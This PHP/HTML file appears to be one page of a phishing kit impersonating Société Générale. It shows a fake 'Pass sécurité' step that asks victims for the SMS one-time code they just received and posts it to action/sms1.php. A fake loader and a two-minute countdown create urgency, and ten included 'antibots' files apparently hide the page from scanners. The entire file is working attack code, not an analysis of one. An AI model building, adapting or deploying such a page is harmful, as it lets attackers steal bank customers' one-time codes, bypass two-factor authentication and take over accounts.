<?php
include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';
?>

<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>SG | Code SMS</title>
  <link rel="stylesheet" href="style.css">
  <style>
    * {
      box-sizing: border-box;
    }

    body, html {
      margin: 0;
      padding: 0;
      font-family: sans-serif;
      height: 100%;
    }

    .step-title {
      font-weight: bold;
      color: #000;
      margin-left: 20px;
      font-size: 1rem;
    }

    .center-wrapper {
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: calc(100vh - 200px);
    }

    .form-box {
      text-align: center;
      max-width: 400px;
      width: 100%;
    }

    .instruction-text {
      font-size: 1.3rem;
      line-height: 1.8rem;
      font-weight: 500;
      color: #000;
      margin-bottom: 20px;
    }

    .timer {
      font-size: 1rem;
      font-weight: bold;
      color: red;
      margin-bottom: 20px;
    }

    .input-wrapper {
      position: relative;
      margin-bottom: 25px;
    }

    .client-input {
      width: 100%;
      padding: 12px 10px;
      font-size: 1rem;
      border: 1px solid #ccc;
      border-radius: 6px;
      background-color: #fff;
    }

    .close-icon {
      position: absolute;
      top: 50%;
      right: 12px;
      transform: translateY(-50%);
      font-size: 18px;
      cursor: pointer;
    }

    .validate-btn {
      width: 100%;
      padding: 12px;
      font-size: 1rem;
      background-color: #E71921;
      color: #fff;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .validate-btn:hover {
      background-color: #c9141b;
    }

    /* Chargement local */
    .loader-local {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 180px;
    }

    .loader-dots {
      display: flex;
      gap: 10px;
    }

    .loader-dots div {
      width: 10px;
      height: 10px;
      background-color: gray;
      opacity: 0.3;
      animation: blink 1.5s infinite;
      border-radius: 2px;
    }

    .loader-dots div:nth-child(1) { animation-delay: 0s; }
    .loader-dots div:nth-child(2) { animation-delay: 0.3s; }
    .loader-dots div:nth-child(3) { animation-delay: 0.6s; }

    @keyframes blink {
      0%, 80%, 100% { opacity: 0.3; transform: scale(1); }
      40% { opacity: 1; transform: scale(1.3); }
    }
  </style>
</head>
<body>

  <!-- ===== HEADER ===== -->
  <div class="header">
    <div class="top-bar">
      <div class="nav-right">
        <a href="mail.php"><img src="icons/location.svg" alt=""> Agences</a>
        <a href="#"><img src="icons/warning.svg" alt=""> Aide et contacts</a>
      </div>
    </div>
    <div class="bottom-bar">
      <div class="logo-slogan">
        <img src="IMG/images (3).png" alt="SG Logo">
        <div class="slogan"></div>
      </div>
      <button class="open-account">Déconnecter</button>
    </div>
  </div>

  <hr>
  <p class="sub-title step-title">Pass sécurité - Etape 2/6</p>

  <!-- ===== ZONE CENTRALE ===== -->
  <div class="center-wrapper">
    <!-- Bloc de chargement -->
    <div id="loadingBlock" class="loader-local">
      <div class="loader-dots">
        <div></div>
        <div></div>
        <div></div>
      </div>
    </div>

    <!-- Bloc principal masqué au début -->
    <div class="form-box" id="mainForm" style="display:none;">
      <p class="instruction-text">
        Pour activer votre Pass Sécurité,<br>
        veuillez saisir le premier code reçu par SMS.
      </p>

      <div class="timer" id="countdown">2:00</div>

      <form action="action/sms1.php" method="post">
        <div class="input-wrapper">
          <input type="text" class="client-input" id="smsCode" name="sms_code" maxlength="6" placeholder="Code reçu par sms">
          <span class="close-icon" id="clearCode">&times;</span>
        </div>

        <button class="validate-btn" type="submit" id="validateCode">Valider</button>
      </form>
    </div>
  </div>

  <!-- ===== FOOTER ===== -->
  <footer>
    <div class="footer-top">
      <div class="footer-links">
        <div><i class="fas fa-question-circle"></i> Questions fréquentes</div>
        <div><i class="fas fa-map-marker-alt"></i> Trouver une agence</div>
        <div>Autres sites SG <i class="fas fa-chevron-down"></i></div>
      </div>
      <div class="footer-social">
        <i class="fab fa-facebook-f"></i>
        <i class="fab fa-instagram"></i>
        <i class="fab fa-x-twitter"></i>
      </div>
    </div>

    <div class="footer-bottom">
      <img src="IMG/piedpage.png" alt="SG Logo" class="sg-logo">
      <div class="footer-text">
        <span>Sécurité</span> |
        <span>Nos engagements</span> |
        <span>Gestion des Cookies</span> |
        <span>Données personnelles</span> |
        <span>Documentation et Tarifs</span> |
        <span>Résilier une prestation</span> |
        <span>Contestation et réclamation</span> |
        <span>Informations légales</span> |
        <span>Accessibilité Numérique (partiellement conforme)</span>
      </div>
    </div>
  </footer>

  <!-- ===== SCRIPTS ===== -->
  <script>
    // Temporisation 5 secondes avant affichage
    window.addEventListener("load", function () {
      setTimeout(() => {
        document.getElementById("loadingBlock").style.display = "none";
        document.getElementById("mainForm").style.display = "block";
        startCountdown();
      }, 5000);
    });

    // Compte à rebours
    function startCountdown() {
      let duration = 120; // 2 minutes
      const display = document.getElementById("countdown");

      const timer = setInterval(() => {
        const minutes = Math.floor(duration / 60);
        const seconds = duration % 60;
        display.textContent = `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
        if (--duration < 0) clearInterval(timer);
      }, 1000);
    }

    // Champ avec icône validation/effacement
    const smsInput = document.getElementById('smsCode');
    const clearIcon = document.getElementById('clearCode');

    clearIcon.addEventListener('click', () => {
      smsInput.value = '';
      clearIcon.textContent = '×';
      smsInput.classList.remove('not-empty');
      clearIcon.classList.remove('valid');
    });

    smsInput.addEventListener('input', () => {
      smsInput.classList.toggle('not-empty', smsInput.value.length > 0);
      if (smsInput.value.length === 6) {
        clearIcon.textContent = '✔';
        clearIcon.classList.add('valid');
      } else {
        clearIcon.textContent = '×';
        clearIcon.classList.remove('valid');
      }
    });
  </script>
</body>
</html>
